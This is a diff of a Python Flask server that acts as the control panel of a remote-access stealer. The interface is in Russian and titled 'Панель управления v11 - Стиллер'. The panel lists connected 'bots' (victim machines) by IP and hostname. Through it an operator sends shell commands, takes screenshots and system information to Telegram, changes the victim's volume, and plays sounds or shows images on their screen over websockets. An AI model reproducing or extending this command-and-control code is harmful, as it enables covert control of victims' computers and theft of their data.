@@ -42,14 +42,14 @@ image_files = sorted([f for f in os.listdir(IMAGE_DIR) if os.path.isfile(os.path
 # --- HTML-шаблон ---
 HTML_TEMPLATE = """
 <!doctype html>
-<html lang="ru"><head><meta charset="utf-8"><title>Панель управления<;/title>
+<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
 <style>{% raw %}
     body{font-family:monospace;background-color:#1a1a1a;color:#0f0; margin: 0; padding: 20px;} .container{width:95%; max-width: 1200px; margin:auto;} h1,h2,h3{text-align:center; border-bottom: 1px solid #0f0; padding-bottom: 10px;} .control-block{margin-top:20px;padding:15px;border:1px solid #0f0; border-radius: 5px;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;box-sizing: border-box;} button{background-color:#0f0;color:#1a1a1a;padding:10px 15px;border:none;cursor:pointer;margin-right:10px; margin-top: 5px; transition: background-color 0.2s;} button:hover{background-color:#0c0;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;min-height:50px;max-height: 300px; overflow-y: auto;} input[type="range"]{width: 80%; vertical-align: middle;} output{padding-left:10px;} .media-gallery { display: flex; flex-wrap: wrap; gap: 15px; justify-content: center; max-height: 400px; overflow-y: auto; padding: 10px; background-color: #000;} .media-gallery img { width: 120px; height: 120px; object-fit: cover; border: 2px solid #0f0; cursor: pointer; transition: transform 0.2s, border-color 0.2s; } .media-gallery img:hover { transform: scale(1.1); border-color: #ff0; } .audio-list { display: flex; flex-direction: column; gap: 8px; max-height: 250px; overflow-y: auto; padding-right: 10px;} .audio-item { background-color: #2a2a2a; padding: 10px; cursor: pointer; border-left: 4px solid #0f0; transition: background-color 0.2s; } .audio-item:hover { background-color: #444; }
-    .stealer-buttons button { background-color: #c00; color: #fff; } /* Выделяем опасные кнопки красным */
+    .stealer-buttons button { background-color: #c00; color: #fff; }
     .stealer-buttons button:hover { background-color: #a00; }
 {% endraw %}</style>
 </head><body onload="initializePanel()">
-<div class="container"><h1>Панель управления v11 - Стиллер</h1>;<h2>Активные боты: {{ bots_list|length }}</h2>
+<div class="container"><h1>Панель управления v11 - Стиллер</h1><h2>Активные боты: {{ bots_list|length }}</h2>
 {% if bots_list %}
     <div class="control-block"><h3>Цель</h3><select id="main_bot_select" onchange="onBotSelect()"></select></div>
     <div class="control-block"><h3>Редактор имени</h3><input type="text" id="alias_input" placeholder="Введите новый псевдоним цели..."><button onclick="renameBot()">Переименовать</button></div>
@@ -63,7 +63,7 @@ HTML_TEMPLATE = """
     <div class="control-block"><h3>Фонотека</h3><div class="audio-list" id="audio_list"></div></div>
     <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand('command_input')">Отправить</button></div>
     <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
-    <div class="control-block"><h3>Специальные команды</h3><button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button><;button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
+    <div class="control-block"><h3>Специальные команды</h3><button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
     <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
 {% else %}<p>Нет активных ботов.</p>{% endif %}
 </div>
@@ -72,7 +72,8 @@ HTML_TEMPLATE = """
     const mainBotSelect = document.getElementById('main_bot_select'); const imageGallery = document.getElementById('image_gallery'); const audioList = document.getElementById('audio_list'); const volumeSlider = document.getElementById('volume_slider'); const volumeOutput = document.getElementById('volume_output'); const resultOutput = document.getElementById('result_output_pre'); const aliasInput = document.getElementById('alias_input');
     function formatBotName(ip, data) { return `${ip} - ${data.hostname || '...'} ${data.alias ? ' : ' + data.alias : ''}`; }
     function onBotSelect() { const botId = mainBotSelect.value; if (!botId) return; aliasInput.value = BOTS[botId].alias || ''; getCurrentVolume(); }
-    function initializePanel() { if (!mainBotSelect) return; Object.entries(BOTS).forEach(([ip, data]) => { let opt = document.createElement('option'); opt.value = ip; opt.innerHTML = formatBotName(ip, data); mainBotSelect.appendChild(opt); }); IMAGE_FILES.forEach(f => { let img = document.createElement('img'); img.src = `/files/image/${f}`; img.title = f; img.onclick = () => sendFileCommand('showimage', f); imageGallery.appendChild(img); }); AUDIO_FILES.forEach(f => { let div = document.createElement('div'); div.className = 'audio-item'; div.textContent = f; div.onclick = () => sendFileCommand('playsound', f); audioList.appendChild(div); }); if (mainBotSelect.options.length > 0) mainBotSelect.dispatchEvent(new Event('change')); }    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });
+    function initializePanel() { if (!mainBotSelect) return; Object.entries(BOTS).forEach(([ip, data]) => { let opt = document.createElement('option'); opt.value = ip; opt.innerHTML = formatBotName(ip, data); mainBotSelect.appendChild(opt); }); IMAGE_FILES.forEach(f => { let img = document.createElement('img'); img.src = `/files/image/${f}`; img.title = f; img.onclick = () => sendFileCommand('showimage', f); imageGallery.appendChild(img); }); AUDIO_FILES.forEach(f => { let div = document.createElement('div'); div.className = 'audio-item'; div.textContent = f; div.onclick = () => sendFileCommand('playsound', f); audioList.appendChild(div); }); if(mainBotSelect.options.length > 0) mainBotSelect.dispatchEvent(new Event('change')); }
+    if(volumeSlider) volumeSlider.addEventListener('input', () => { volumeOutput.value = volumeSlider.value + '%'; });
     async function sendCommand(endpoint, body) { const botId = mainBotSelect.value; if (!botId) return; body.bot_id = botId; return fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); }
     async function sendControlCommand(command) { sendCommand('/api/control', { command: command }); }
     async function sendFileCommand(command_type, filename) { const full_command = `${command_type} ${filename}`; sendCommand('/api/control', { command: full_command }); }
@@ -127,8 +128,7 @@ def api_control():
     try:
         bots[bot_id]['ws'].send(cmd)
         return jsonify({'status': 'ok'})
-    except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 500
+    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/get_volume', methods=['POST'])
 def api_get_volume():
@@ -147,13 +147,10 @@ def websocket_handler(ws):
     bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
     try:
         first_message = ws.receive(timeout=10)
-        if first_message.startswith("HOSTNAME:"):
-            hostname = first_message.split(":", 1)[1]
+        if first_message.startswith("HOSTNAME:"): hostname = first_message.split(":", 1)[1]
         else: hostname = "unknown_host"
     except Exception:
-        hostname = "timeout_host"
-        ws.close()
-        return
+        hostname = "timeout_host"; ws.close(); return
 
     bots[bot_ip] = {'ws': ws, 'hostname': hostname, 'alias': aliases.get(bot_ip, '')}
     ws_map[ws] = bot_ip
@@ -175,7 +172,8 @@ def websocket_handler(ws):
         dead_bot_ip = ws_map.pop(ws, None)
         if dead_bot_ip:
             for d in [bots, volume_levels, command_results, events]:
-                if dead_bot_ip in d: del d[dead_bot_ip]
+                if dead_bot_ip in d:
+                     del d[dead_bot_ip]
         print(f"[-] Бот {dead_bot_ip or 'unknown'} отвалился.")
 
 if __name__ == '__main__':
